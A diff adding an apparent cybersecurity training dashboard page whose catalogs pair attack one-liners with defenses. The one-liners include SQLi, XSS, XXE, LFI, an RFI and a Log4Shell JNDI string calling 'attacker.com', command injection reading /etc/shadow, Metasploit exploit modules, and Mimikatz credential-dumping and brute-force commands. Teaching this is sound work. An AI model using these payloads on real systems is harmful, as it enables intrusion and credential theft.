@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberDefend Academy · Ultimate Cybersecurity Encyclopedia</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root {
+  --bg: #0a0e14; --bg-card: #131920; --bg-term: #080c10; --fg: #c5cdd8; --fg-br: #e8edf3; --fg-dm: #5a6678;
+  --acc: #00ff9c; --acc-dm: rgba(0,255,156,.12); --red: #ff3b5c; --cyan: #00d4ff; --purple: #a855f7; --yellow: #ffd93d;
+  --border: #1e2733; --mono: 'JetBrains Mono', monospace; --sans: 'Inter', system-ui, sans-serif;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-height: 100vh; display: flex; }
+.bg-grid { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(rgba(0,255,156,.02) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,156,.02) 1px, transparent 1px); background-size: 60px 60px; }
+
+.topbar { height: 60px; width: calc(100% - 320px); position: fixed; top: 0; left: 320px; background: var(--bg-card); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; z-index: 100; }
+.topbar h2 { font-size: 1.2rem; color: var(--fg-br); font-weight: 700; }
+.topbar .status { color: var(--acc); font-family: var(--mono); font-size: 0.85rem; display: flex; align-items: center; gap: 8px; }
+
+.sidebar { width: 320px; background: #0f1419; border-right: 1px solid var(--border); overflow-y: auto; height: 100vh; position: fixed; top: 0; left: 0; z-index: 90; }
+.sidebar-header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); margin-bottom: 15px; }
+.sidebar-header h1 { color: var(--fg-br); font-size: 1.2rem; font-weight: 800; }
+.sidebar-header span { color: var(--acc); }
+.back-btn { display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--bg-card); color: var(--cyan); padding: 10px; margin: 0 15px 20px; border-radius: 8px; text-decoration: none; font-weight: 700; font-size: 0.8rem; border: 1px solid var(--border); transition: 0.2s; }
+.back-btn:hover { border-color: var(--cyan); }
+
+.tree-item { margin-bottom: 2px; }
+.tree-cat { padding: 10px 20px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; font-size: 0.8rem; font-weight: 700; color: var(--fg-br); background: rgba(255,255,255,0.02); border-left: 3px solid transparent; transition: 0.2s; }
+.tree-cat:hover { background: rgba(255,255,255,0.05); border-left-color: var(--cyan); }
+.tree-cat i { transition: 0.3s; font-size: 0.6rem; }
+.tree-item.open .tree-cat i { transform: rotate(90deg); }
+
+.tree-sub { display: none; padding-left: 10px; }
+.tree-item.open .tree-sub { display: block; }
+
+.tree-link { padding: 6px 20px; display: flex; align-items: center; gap: 8px; cursor: pointer; color: var(--fg-dm); font-size: 0.75rem; border-left: 3px solid transparent; transition: 0.2s; }
+.tree-link:hover { background: rgba(255,255,255,0.03); color: var(--fg); }
+.tree-link.active { background: var(--acc-dm); border-left-color: var(--acc); color: var(--acc); }
+
+.content { flex: 1; padding: 80px 30px 30px 30px; position: relative; z-index: 1; max-width: 1100px; margin-left: 320px; }
+.header { margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+.header h1 { font-size: 2.2rem; color: var(--fg-br); margin-bottom: 10px; }
+.header p { color: var(--fg-dm); line-height: 1.6; font-size: 1.1rem; }
+.card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 25px; margin-bottom: 20px; }
+.card h3 { color: var(--acc); margin-bottom: 15px; display: flex; align-items: center; gap: 10px; font-size: 1.2rem; }
+.card p, .card li { color: var(--fg); line-height: 1.7; font-size: 0.95rem; margin-bottom: 10px; }
+.card ul { padding-left: 20px; margin-bottom: 15px; }
+.card code { background: var(--bg-term); padding: 3px 6px; border-radius: 4px; color: var(--cyan); font-family: var(--mono); }
+.card strong { color: var(--fg-br); }
+
+/* Attack Catalog UI */
+.catalog-layout { display: flex; gap: 20px; margin-top: 20px; }
+.cat-list { width: 280px; display: flex; flex-direction: column; gap: 5px; }
+.cat-btn { text-align: left; padding: 10px 15px; background: var(--bg); border: 1px solid var(--border-light); color: var(--fg-br); border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; }
+.cat-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+.cat-btn.active { background: var(--cyan); color: #000; border-color: var(--cyan); font-weight: 700; }
+
+.cat-details { flex: 1; background: var(--bg-term); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
+.cat-details h4 { color: var(--red); font-size: 1.1rem; margin-bottom: 10px; font-family: var(--mono); }
+.cat-details h4.tool { color: var(--cyan); }
+.cat-details .payload { background: #000; color: var(--acc); padding: 10px; border-radius: 4px; font-family: var(--mono); font-size: 0.8rem; margin-bottom: 15px; border-left: 4px solid var(--acc); word-break: break-all; }
+.cat-details .defense { background: rgba(0, 255, 156, 0.05); border: 1px solid var(--acc-dm); padding: 10px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 15px; }
+.cat-details .desc { color: var(--fg-dm); font-size: 0.9rem; line-height: 1.6; }
+
+/* CLI Terminal Mini */
+.term-bar { background: #0d1117; border: 1px solid var(--border); border-bottom: none; border-radius: 10px 10px 0 0; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; }
+.term-dots { display: flex; gap: 6px; }
+.term-dots span { width: 11px; height: 11px; border-radius: 50%; }
+.term-dots span:nth-child(1) { background: #ff5f57; }
+.term-dots span:nth-child(2) { background: #febc2e; }
+.term-dots span:nth-child(3) { background: #28c840; }
+.term-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--fg-dm); padding: 4px 10px; border-radius: 5px; cursor: pointer; font-size: 0.7rem; font-family: var(--mono); }
+.term-btn:hover { border-color: var(--acc); color: var(--acc); }
+.term-body { background: var(--bg-term); border: 1px solid var(--border); border-top: none; border-radius: 0 0 10px 10px; height: 220px; overflow-y: auto; padding: 15px; font-family: var(--mono); font-size: 0.85rem; line-height: 1.5; }
+.t-line { white-space: pre-wrap; word-break: break-all; color: var(--fg); }
+.t-prompt { color: var(--acc); }
+.t-cmd { color: var(--fg-br); }
+.t-out { color: var(--fg-dm); }
+.t-suc { color: var(--acc); }
+.t-err { color: var(--red); }
+.input-line { display: flex; align-items: center; gap: 6px; margin-top: 5px; }
+.input-line input { flex: 1; background: transparent; border: none; outline: none; color: var(--fg-br); font-family: var(--mono); font-size: 0.85rem; caret-color: var(--acc); }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+
+<header class="topbar">
+  <h2>CyberDefend Academy Dashboard</h2>
+  <div style="display:flex; align-items:center; gap: 20px;">
+    <div class="status"><i class="fas fa-graduation-cap"></i> Modules Completed: <span id="progCount">0</span></div>
+  </div>
+</header>
+
+<aside class="sidebar">
+  <div class="sidebar-header">
+    <h1>CyberDefend <span>Encyclopedia</span></h1>
+    <p style="font-size: 0.7rem; color: var(--fg-dm); margin-top: 5px;">Complete Interactive Curriculum</p>
+  </div>
+  <a href="paid-cybersecurity-course.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Main Portal</a>
+  <div id="treeView"></div>
+</aside>
+
+<main class="content">
+  <div class="header">
+    <h1 id="mainTitle">Ultimate Cybersecurity Encyclopedia</h1>
+    <p id="mainDesc">Select a module to view deep-dive explanations, commands, and interactive simulations.</p>
+  </div>
+  <div id="contentArea">
+    <div class="card">
+      <h3><i class="fas fa-info-circle"></i> Course Structure</h3>
+      <p>This dashboard covers 10 core tracks. It includes where to start, vulnerability management, exhaustive attack catalogs, interactive CLI labs, and a massive Kali Linux tool encyclopedia. Every concept is explained in detail.</p>
+    </div>
+	
+	<div class="card">
+      <h3><i class="fas fa-info-circle"></i> Course Structure</h3>
+      <p>This academy is divided into 5 core tracks:</p>
+      <ul>
+        <li><strong style="color:var(--cyan)">Beginner:</strong> Core concepts, CIA Triad, Networking, Cryptography.</li>
+        <li><strong style="color:var(--cyan)">Defense:</strong> Firewalls, IDS/IPS, IAM, Endpoint Security.</li>
+        <li><strong style="color:var(--cyan)">Offense:</strong> Recon, Exploitation, Web App Attacks, AD Attacks.</li>
+        <li><strong style="color:var(--cyan)">DFIR:</strong> Log Analysis, Memory Forensics, Incident Response.</li>
+        <li><strong style="color:var(--cyan)">Cloud & DevSecOps:</strong> AWS Security, CI/CD, Containers.</li>
+      </ul>
+    </div>
+  </div>
+</main>
+
+<script>
+// ============================================================
+// EXHAUSTIVE CURRICULUM DATA
+// ============================================================
+const CURRICULUM = [
+  { cat: "1. Getting Started", icon: "fa-rocket", modules: [
+    { id: "setup", title: "Where to Start & Install", type: "info" },
+    { id: "cve", title: "CVE, CVSS & MITRE ATT&CK", type: "info" }
+  ]},
+  { cat: "2. Fundamentals & Architecture", icon: "fa-seedling", modules: [
+    { id: "cia", title: "CIA Triad", type: "info" },
+    { id: "aaa", title: "AAA (Auth, Authz, Acct)", type: "info" },
+    { id: "crypto", title: "Cryptography & Hashing", type: "info" },
+    { id: "networking", title: "OSI Model & Protocols", type: "info" }
+  ]},
+  { cat: "3. GRC (Gov, Risk, Compliance)", icon: "fa-balance-scale", modules: [
+    { id: "nist", title: "NIST CSF", type: "info" },
+    { id: "iso", title: "ISO 27001", type: "info" },
+    { id: "pci", title: "PCI-DSS", type: "info" },
+    { id: "risk", title: "Risk Management", type: "info" }
+  ]},
+  { cat: "4. Network Defense (Blue Team)", icon: "fa-shield-halved", modules: [
+    { id: "firewalls", title: "Firewalls & ACLs", type: "cli" },
+    { id: "ids_ips", title: "IDS/IPS (Snort)", type: "cli" },
+    { id: "soc", title: "SOC & SIEM Monitoring", type: "siem" },
+    { id: "zero_trust", title: "Zero Trust Arch", type: "info" }
+  ]},
+  { cat: "5. Offensive Ops (Red Team)", icon: "fa-skull", modules: [
+    { id: "recon", title: "Recon (Nmap)", type: "cli" },
+    { id: "vuln_scanning", title: "Vuln Scanning (Nessus/Nmap)", type: "cli" },
+    { id: "web_attacks", title: "Web App Attacks (OWASP)", type: "catalog", data: [
+      { name: "SQL Injection (SQLi)", payload: "admin' OR 1=1--", tool: "sqlmap", defense: "Use Prepared Statements (Parameterized Queries).", desc: "Executing malicious SQL commands to dump databases or bypass logins." },
+      { name: "Cross-Site Scripting (XSS)", payload: "<img src=x o\\u006eerror=alert(1)>", tool: "Burp Suite", defense: "Output encoding (HTML escaping) and CSP.", desc: "Injecting client-side scripts into web pages viewed by other users." },
+      { name: "CSRF", payload: "<img src='http://bank.com/transfer?to=attacker'>", tool: "OWASP ZAP", defense: "Anti-CSRF tokens.", desc: "Forcing an authenticated user to execute unwanted actions." },
+      { name: "SSRF", payload: "http://localhost/admin_panel", tool: "Burp Suite", defense: "Whitelist allowed domains for server requests.", desc: "Forcing a server to make requests to internal resources." },
+      { name: "XXE", payload: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", tool: "Burp Suite", defense: "Disable DTD processing in XML parsers.", desc: "Exploiting XML parsers to read local files or initiate SSRF." },
+      { name: "LFI", payload: "?page=../../../../etc/passwd", tool: "Burp Suite", defense: "Whitelist allowed files; strip '../'.", desc: "Including local files on the server through the web browser." },
+      { name: "RFI", payload: "?page=http://attacker.com/shell.txt", tool: "Burp Suite", defense: "Disable allow_url_include in PHP.", desc: "Including remote files, often leading to RCE." },
+      { name: "Command Injection", payload: "; cat /etc/shadow", tool: "Commix", defense: "Use safe APIs; avoid shell commands.", desc: "Executing operating system commands on the host server." },
+      { name: "IDOR", payload: "GET /api/users/1001 -> /api/users/1002", tool: "Burp Suite", defense: "Strict access control checks on objects.", desc: "Accessing objects directly by manipulating IDs." }
+    ]},
+    { id: "metasploit", title: "Metasploit Framework", type: "catalog", data: [
+      { name: "EternalBlue (MS17-010)", payload: "use exploit/windows/smb/ms17_010_eternalblue", tool: "Metasploit", defense: "Apply MS17-010 patch; block SMB.", desc: "SMBv1 remote code execution flaw used by WannaCry." },
+      { name: "BlueKeep (CVE-2019-0708)", payload: "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce", tool: "Metasploit", defense: "Patch RDP; disable NLA.", desc: "RDP vulnerability allowing pre-auth RCE." },
+      { name: "Log4Shell (CVE-2021-44228)", payload: "${jndi:ldap://attacker.com/x}", tool: "Metasploit", defense: "Update Log4j; block outbound LDAP.", desc: "JNDI injection in Apache Log4j leading to RCE." },
+      { name: "VSFTPD Backdoor", payload: "use exploit/unix/ftp/vsftpd_234_backdoor", tool: "Metasploit", defense: "Update VSFTPD.", desc: "Malicious backdoor inserted into the VSFTPD source code." },
+      { name: "Shellshock", payload: "use exploit/multi/http/apache_mod_cgi_bash_env_exec", tool: "Metasploit", defense: "Update Bash.", desc: "Bash vulnerability allowing execution of commands via environment variables." }
+    ]},
+    { id: "ad_attacks", title: "Active Directory Attacks", type: "catalog", data: [
+      { name: "Kerberoasting", payload: "GetUserSPNs.py corp.local/user:pass -request", tool: "Impacket", defense: "Strong passwords for Service Accounts.", desc: "Requesting TGS tickets for services and cracking them offline." },
+      { name: "AS-REP Roasting", payload: "GetNPUsers.py corp.local/ -usersfile users.txt", tool: "Impacket", defense: "Disable 'Do not require Kerberos preauth'.", desc: "Requesting AS-REP tickets for users with preauth disabled." },
+      { name: "Pass-the-Hash (PtH)", payload: "crackmapexec smb 10.0.0.5 -u admin -H aad3b...", tool: "CrackMapExec", defense: "Disable NTLM; enforce Kerberos.", desc: "Authenticating using an NTLM hash instead of a password." },
+      { name: "Golden Ticket", payload: "mimikatz # kerberos::golden /user:Admin /krbtgt:HASH", tool: "Mimikatz", defense: "Protect KRBTGT; reset password twice.", desc: "Forging TGTs using the KRBTGT hash." },
+      { name: "DCSync", payload: "mimikatz # lsadump::dcsync /user:Administrator", tool: "Mimikatz", defense: "Restrict Replication privileges.", desc: "Simulating a Domain Controller to request password hashes." }
+    ]}
+  ]},
+  { cat: "6. DFIR (Forensics & IR)", icon: "fa-magnifying-glass-chart", modules: [
+    { id: "log_analysis", title: "Log Analysis (grep)", type: "cli" },
+    { id: "memory", title: "Memory Forensics (Volatility)", type: "cli" },
+    { id: "ir", title: "Incident Response (PICERL)", type: "info" }
+  ]},
+  { cat: "7. Cloud Security", icon: "fa-cloud", modules: [
+    { id: "aws", title: "AWS S3 & IAM", type: "cli" },
+    { id: "containers", title: "Container Security", type: "info" }
+  ]},
+  { cat: "8. DevSecOps", icon: "fa-code-branch", modules: [
+    { id: "sast", title: "SAST & Code Scanning", type: "info" },
+    { id: "cicd", title: "CI/CD Pipeline Security", type: "info" }
+  ]},
+  { cat: "9. Malware Analysis", icon: "fa-virus", modules: [
+    { id: "static", title: "Static Analysis", type: "cli" },
+    { id: "dynamic", title: "Dynamic Analysis (Sandbox)", type: "cli" }
+  ]},
+  { cat: "10. The Kali Linux Arsenal", icon: "fa-dragon", modules: [
+    { id: "kali_info", title: "Info Gathering & OSINT", type: "catalog", data: [
+      { name: "Nmap", payload: "nmap -sV -sC 10.10.10.5", tool: "Network Mapper", defense: "N/A", desc: "Network discovery and security auditing." },
+      { name: "Maltego", payload: "maltego", tool: "OSINT Graphing", defense: "N/A", desc: "Graphical link analysis for OSINT gathering." },
+      { name: "Recon-ng", payload: "recon-ng", tool: "Web Recon", defense: "N/A", desc: "Full-featured web reconnaissance framework." },
+      { name: "theHarvester", payload: "theHarvester -d target.com -b google", tool: "Email/Subdomain", defense: "N/A", desc: "Gather emails, subdomains, and employee names." },
+      { name: "Shodan", payload: "shodan search apache", tool: "Search Engine", defense: "N/A", desc: "Search engine for Internet-connected devices." }
+    ]},
+    { id: "kali_web", title: "Web Application Tools", type: "catalog", data: [
+      { name: "Burp Suite", payload: "burpsuite &", tool: "Web Proxy", defense: "N/A", desc: "Graphical tool to intercept and modify web traffic." },
+      { name: "OWASP ZAP", payload: "zap-cli quick-scan http://target", tool: "Web Scanner", defense: "N/A", desc: "Open-source alternative to Burp Suite." },
+      { name: "SQLmap", payload: "sqlmap -u 'http://target?id=1' --dump", tool: "SQLi Automation", defense: "N/A", desc: "Automates the detection and exploitation of SQLi." },
+      { name: "Nikto", payload: "nikto -h http://target", tool: "Web Server Scanner", defense: "N/A", desc: "Scans for dangerous files and outdated software." },
+      { name: "Gobuster", payload: "gobuster dir -u http://target -w wordlist", tool: "Directory Brute-force", defense: "N/A", desc: "Finds hidden directories and files." }
+    ]},
+    { id: "kali_exploit", title: "Exploitation Frameworks", type: "catalog", data: [
+      { name: "Metasploit", payload: "msfconsole", tool: "Exploitation", defense: "N/A", desc: "The industry standard for exploit development and execution." },
+      { name: "Searchsploit", payload: "searchsploit apache 2.4", tool: "Exploit DB", defense: "N/A", desc: "Command line search for Exploit-DB." },
+      { name: "BeEF", payload: "./beef", tool: "Browser Exploit", defense: "N/A", desc: "Focuses on the web browser to launch client-side attacks." },
+      { name: "SET", payload: "setoolkit", tool: "Social Engineering", defense: "N/A", desc: "Framework for phishing and social engineering attacks." }
+    ]},
+    { id: "kali_password", title: "Password Cracking", type: "catalog", data: [
+      { name: "Hashcat", payload: "hashcat -m 1000 hash.txt rockyou.txt", tool: "GPU Cracker", defense: "Use strong passwords.", desc: "World's fastest password cracker using GPU." },
+      { name: "John the Ripper", payload: "john --wordlist=rockyou.txt hashes.txt", tool: "CPU Cracker", defense: "Use strong passwords.", desc: "Autodetects and cracks password hashes." },
+      { name: "Hydra", payload: "hydra -l admin -P rockyou.txt ssh://10.10.10.5", tool: "Online Brute-force", defense: "Lockout policies.", desc: "Fast network logon cracker." },
+      { name: "Medusa", payload: "medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ssh", tool: "Online Brute-force", defense: "Lockout policies.", desc: "Parallel network logon cracker." }
+    ]},
+    { id: "kali_sniff", title: "Sniffing & Spoofing", type: "catalog", data: [
+      { name: "Wireshark", payload: "tshark -i eth0", tool: "Packet Analyzer", defense: "Encryption (HTTPS/SSH).", desc: "Interactively dump and analyze network traffic." },
+      { name: "Bettercap", payload: "bettercap -iface eth0", tool: "MITM", defense: "Static ARP, HTTPS.", desc: "Powerful, flexible tool to perform MITM attacks." },
+      { name: "Ettercap", payload: "ettercap -T -M arp /target// /gateway//", tool: "MITM", defense: "Static ARP, HTTPS.", desc: "Comprehensive suite for man-in-the-middle attacks." },
+      { name: "Responder", payload: "responder -I eth0 -wrf", tool: "LLMNR/NBT-NS Poisoner", defense: "Disable LLMNR/NBT-NS.", desc: "Answers NBT-NS queries to capture NTLMv2 hashes." }
+    ]},
+    { id: "kali_post", title: "Post-Exploitation", type: "catalog", data: [
+      { name: "Mimikatz", payload: "sekurlsa::logonpasswords", tool: "Credential Dumping", defense: "LSASS protection, LSA Protection.", desc: "Extracts plaintext passwords, hashes, and Kerberos tickets." },
+      { name: "BloodHound", payload: "Invoke-BloodHound -CollectionMethod All", tool: "AD Graphing", defense: "Audit AD ACLs.", desc: "Identifies complex attack paths in Active Directory." },
+      { name: "Evil-WinRM", payload: "evil-winrm -i 10.10.10.5 -u admin -p pass", tool: "WinRM Shell", defense: "Restrict WinRM access.", desc: "Ultimate WinRM shell for hacking." },
+      { name: "PowerSploit", payload: "Invoke-Mimikatz", tool: "PowerShell Framework", defense: "AMSI, Constrained Lang Mode.", desc: "PowerShell post-exploitation framework." }
+    ]},
+    { id: "kali_forensics", title: "Forensics & Stego", type: "catalog", data: [
+      { name: "Volatility", payload: "volatility -f mem.raw pslist", tool: "Memory Forensics", defense: "N/A", desc: "Extracts artifacts from memory dumps." },
+      { name: "Autopsy", payload: "autopsy &", tool: "Disk Forensics", defense: "N/A", desc: "GUI for The Sleuth Kit to analyze disk images." },
+      { name: "Binwalk", payload: "binwalk -e firmware.bin", tool: "Firmware Analyzer", defense: "N/A", desc: "Searches binary images for embedded files." },
+      { name: "Steghide", payload: "steghide extract -sf image.jpg", tool: "Steganography", defense: "N/A", desc: "Hides and extracts data in image/audio files." }
+    ]}
+  ]}
+];
+
+const TreeView = document.getElementById('treeView');
+const ContentArea = document.getElementById('contentArea');
+const MainTitle = document.getElementById('mainTitle');
+const MainDesc = document.getElementById('mainDesc');
+let completedModules = new Set();
+let currentModule = null;
+
+function renderTree() {
+  let html = '';
+  CURRICULUM.forEach((cat, ci) => {
+    html += `<div class="tree-item ${ci===0?'open':''}">
+      <div class="tree-cat" onclick="toggleTree(this)"><span><i class="fas ${cat.icon}" style="margin-right:8px; color:var(--cyan);"></i> ${cat.cat}</span> <i class="fas fa-chevron-right"></i></div>
+      <div class="tree-sub">`;
+    cat.modules.forEach(mod => {
+      const done = completedModules.has(mod.id);
+      html += `<div class="tree-link ${done?'done':''}" onclick="loadModule('${mod.id}', '${mod.title}', '${mod.type}', this)"><i class="fas ${done?'fa-check-circle':'fa-circle'}" style="font-size:0.6rem;"></i> ${mod.title}</div>`;
+    });
+    html += `</div></div>`;
+  });
+  TreeView.innerHTML = html;
+}
+
+function toggleTree(el) { el.parentElement.classList.toggle('open'); }
+
+function loadModule(id, title, type, el) {
+  currentModule = id;
+  MainTitle.innerText = title;
+  MainDesc.innerText = "Read the objective, then interact with the simulation below to complete the module.";
+  document.querySelectorAll('.tree-link').forEach(l => l.classList.remove('active'));
+  el.classList.add('active');
+  
+  if (type === 'catalog') renderCatalogModule(id, title);
+  else if (type === 'cli') renderCLIModule(id, title);
+  else if (id === 'soc') renderSOCModule();
+  else renderInfoModule(id, title);
+}
+
+function completeModule(id) {
+  if (!completedModules.has(id)) {
+    completedModules.add(id);
+    document.getElementById('progCount').innerText = completedModules.size;
+    renderTree();
+    const btn = document.querySelector('.card .term-btn[onclick*="completeModule"]');
+    if (btn) {
+      btn.innerHTML = '<i class="fas fa-check"></i> Module Completed!';
+      btn.disabled = true;
+      btn.style.borderColor = 'var(--acc)';
+      btn.style.color = 'var(--acc)';
+    }
+  }
+}
+
+// --- CATALOG ENGINE (Attacks & Tools) ---
+function renderCatalogModule(id, title) {
+  let data = [];
+  CURRICULUM.forEach(c => c.modules.forEach(m => { if(m.id === id) data = m.data; }));
+  
+  let btnsHtml = '';
+  data.forEach((item, i) => {
+    btnsHtml += `<button class="cat-btn ${i===0?'active':''}" onclick="updateCatalog(${i}, '${id}')">${item.name}</button>`;
+  });
+  
+  ContentArea.innerHTML = `<div class="card">
+    <h3><i class="fas fa-book-skull"></i> ${title}</h3>
+    <p>Click on an item to view its exact command/payload, category, and description.</p>
+    <div class="catalog-layout">
+      <div class="cat-list">${btnsHtml}</div>
+      <div class="cat-details" id="catDetails">Select an item...</div>
+    </div>
+    <button class="term-btn" style="margin-top:15px; border-color:var(--acc); color:var(--acc);" onclick="completeModule('${id}')">Mark as Complete</button>
+  </div>`;
+  
+  updateCatalog(0, id);
+}
+
+function updateCatalog(idx, modId) {
+  let data = [];
+  CURRICULUM.forEach(c => c.modules.forEach(m => { if(m.id === modId) data = m.data; }));
+  const item = data[idx];
+  
+  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.cat-btn')[idx].classList.add('active');
+  
+  let defenseHtml = item.defense !== 'N/A' ? `<div class="defense"><strong><i class="fas fa-shield"></i> Defense:</strong> ${item.defense}</div>` : '';
+  
+  document.getElementById('catDetails').innerHTML = `
+    <h4 class="tool"><i class="fas fa-bug"></i> ${item.name}</h4>
+    <p><strong>Tool/Category:</strong> ${item.tool}</p>
+    <div class="payload">${item.payload}</div>
+    ${defenseHtml}
+    <div class="desc"><strong>Description:</strong> ${item.desc}</div>
+  `;
+}
+
+// --- CLI ENGINE MAP ---
+const CLI_STEPS = {
+  "firewalls": { prompt: "fw(config)#", steps: [
+    {i:"Assign IP to Outside interface.", h:"Command: <code>ip address outside 203.0.113.1 255.255.255.0</code>", v:c=>/ip\s+address\s+outside\s+203\.0\.113\.1/i.test(c), o:"Interface outside configured.", s:"Step 1 complete."},
+    {i:"Enable the interface.", h:"Command: <code>no shutdown</code>", v:c=>/no\s+shutdown/i.test(c), o:"Interface is now active.", s:"Module complete!"}
+  ]},
+  "ids_ips": { prompt: "snort:~$", steps: [
+    {i:"Run Snort in IDS mode on eth0.", h:"Command: <code>snort -i eth0 -A console -c /etc/snort/snort.conf</code>", v:c=>/snort\s+-i\s+eth0/i.test(c), o:"[*] Snort initialized. Listening on eth0.", s:"Module complete!"}
+  ]},
+  "recon": { prompt: "root@kali:~$", steps: [
+    {i:"Run a service version scan.", h:"Command: <code>nmap -sV 10.10.10.5</code>", v:c=>/nmap\s+-sV\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http", s:"Scan complete!"}
+  ]},
+  "vuln_scanning": { prompt: "root@kali:~$", steps: [
+    {i:"Use Nmap to scan for known vulnerabilities (CVEs).", h:"Command: <code>nmap --script vuln 10.10.10.5</code>", v:c=>/nmap\s+--script\s+vuln\s+10\.10\.10\.5/i.test(c), o:"[*] Scanning for vulnerabilities...\nVULNERABLE: CVE-2017-0144 (EternalBlue)", s:"CVE found via Nmap!"}
+  ]},
+  "log_analysis": { prompt: "analyst@siem:~$", steps: [
+    {i:"Find failed SSH logins.", h:"Command: <code>grep \"Failed password\" auth.log</code>", v:c=>/grep\s+["']Failed password["']\s+auth\.log/i.test(c), o:"Failed password for root from 45.33.21.9 port 22", s:"Attack identified!"}
+  ]},
+  "memory": { prompt: "forensics@dfir:~$", steps: [
+    {i:"List running processes.", h:"Command: <code>volatility -f mem.raw pslist</code>", v:c=>/volatility\s+-f\s+mem\.raw\s+pslist/i.test(c), o:"PID 1024: svchost.exe\nPID 1025: mimikatz.exe", s:"Malware found!"}
+  ]},
+  "aws": { prompt: "aws:~$", steps: [
+    {i:"List files in the bucket.", h:"Command: <code>aws s3 ls --recursive s3://company-data</code>", v:c=>/aws\s+s3\s+ls\s+--recursive\s+s3:\/\/company-data/i.test(c), o:"2024-01-01 secrets.txt\n2024-01-02 backup.sql", s:"Data exfiltration risk found!"}
+  ]},
+  "static": { prompt: "malware@lab:~$", steps: [
+    {i:"Extract strings from the binary.", h:"Command: <code>strings malware.exe | grep http</code>", v:c=>/strings\s+malware\.exe\s*\|\s*grep\s+http/i.test(c), o:"http://malicious-c2.com/payload", s:"C2 URL found!"}
+  ]},
+  "dynamic": { prompt: "malware@lab:~$", steps: [
+    {i:"Run the malware in a controlled sandbox.", h:"Command: <code>sudo ./malware.exe</code>", v:c=>/sudo\s+\.\/malware\.exe/i.test(c), o:"[*] Malware executed. Network traffic captured.", s:"Behavior observed!"}
+  ]}
+};
+
+function renderCLIModule(id, title) {
+  const config = CLI_STEPS[id];
+  ContentArea.innerHTML = `<div class="card"><h3><i class="fas fa-terminal"></i> ${title}</h3><p>Complete the task using the terminal below.</p></div>
+    <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><button class="term-btn" onclick="showSol()">Reveal Solution</button></div>
+    <div class="term-body" id="termBody"></div>`;
+  initTerminal(config.prompt, id, config.steps);
+}
+
+function showSol() {
+  const i = document.getElementById('in');
+  if(i) {
+    const stepIdx = document.querySelectorAll('.t-suc').length;
+    const config = CLI_STEPS[currentModule];
+    if(config && config.steps[stepIdx]) {
+      const m = config.steps[stepIdx].h.match(/<code>([^<]+)<\/code>/);
+      if (m) i.value = m[1];
+      i.focus();
+    }
+  }
+}
+
+// --- TERMINAL ENGINE ---
+function initTerminal(prompt, modId, steps) {
+  const tb = document.getElementById('termBody');
+  tb.innerHTML = `<div class="t-line t-out">Type commands and press Enter.</div>`;
+  let currentStep = 0;
+  function addInput() {
+    const d = document.createElement('div');
+    d.className = 'input-line';
+    d.innerHTML = `<span class="t-prompt">${prompt}</span><input type="text" id="in" autocomplete="off">`;
+    tb.appendChild(d);
+    const i = document.getElementById('in');
+    i.focus();
+    i.addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        const c = i.value;
+        if(!c.trim()) return;
+        i.remove();
+        const cmdLine = document.createElement('div');
+        cmdLine.className = 't-line';
+        cmdLine.innerHTML = `<span class="t-prompt">${prompt}</span> <span class="t-cmd">${c}</span>`;
+        tb.appendChild(cmdLine);
+        const step = steps[currentStep];
+        if (step.v(c)) {
+          const out = document.createElement('div');
+          out.className = 't-line t-out';
+          out.textContent = step.o;
+          tb.appendChild(out);
+          const suc = document.createElement('div');
+          suc.className = 't-line t-suc';
+          suc.textContent = '[+] ' + step.s;
+          tb.appendChild(suc);
+          currentStep++;
+          if (currentStep < steps.length) { addInput(); } else { completeModule(modId); }
+        } else {
+          const err = document.createElement('div');
+          err.className = 't-line t-err';
+          err.textContent = '[-] Invalid command. Hint: ' + step.h;
+          tb.appendChild(err);
+          addInput();
+        }
+        tb.scrollTop = tb.scrollHeight;
+      }
+    });
+  }
+  addInput();
+}
+
+// --- SIEM MODULE ---
+function renderSOCModule() {
+  ContentArea.innerHTML = `<div class="card"><h3><i class="fas fa-desktop"></i> SOC & SIEM Monitoring</h3><p>Click "Run Correlation Rule" to identify the brute-force attack in the logs.</p>
+    <div class="cat-details" style="display:block; text-align:left; padding:0; overflow:hidden;">
+      <table style="width:100%; border-collapse:collapse; font-family:var(--mono); font-size:0.8rem;">
+        <tr style="background:#1a1a1a;"><th style="padding:8px; text-align:left; color:var(--cyan);">Time</th><th style="padding:8px; text-align:left; color:var(--cyan);">User</th><th style="padding:8px; text-align:left; color:var(--cyan);">Src IP</th><th style="padding:8px; text-align:left; color:var(--cyan);">Action</th><th style="padding:8px; text-align:left; color:var(--cyan);">Status</th></tr>
+        <tbody id="siemLogs">
